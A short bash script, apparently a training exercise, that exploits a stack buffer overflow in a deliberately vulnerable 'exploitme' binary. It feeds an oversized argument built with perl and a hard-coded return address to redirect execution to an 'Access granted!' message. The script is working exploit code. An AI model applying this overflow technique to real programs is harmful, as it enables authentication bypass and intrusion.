#!/bin/bash
#
# Author: Antonio VÃ¡zquez Blanco
# Email: antoniovazquezblanco@gmail.com
#
# Description:
# When more than 30 characters as first argument to the program a buffer overflow occurs.
# If more than 30 characters are passed as the first argument strcpy copies more than 30 characters into the "pass" variable which is overflowded and as this occurs in a function the return address can be overwritten so that we can make eip register point to the printf instruction that prints the "Access granted!" message.
# If the address is overwritten it will print the passed message although it will segfault.
#

if [ x$1 == x ]
then
	echo "Please provide a path to the executable:"
	echo "$0 exploitme-win.exe"
	exit
fi

if [ ! -z $(uname | grep "Linux") ]
then
	# Linux
	./$1 $(perl -e 'printf "A"x42 . "\x96\x84\x04\x08";')
fi
if [ ! -z $(uname | grep "Darwin") ]
then
	# Mac OS
	#./$1 $(perl -e 'printf "A"x38 . "\xfc\x0d\x00\x00\x01\x00\x00\x00"')
	echo "Not supported yet..."
fi
if [ ! -z $(uname | grep "MINGW") ]
then
	# Windows
	./$1 $(perl -e 'printf "A"x42 . "\xf7\x13\x40\x00"')
fi
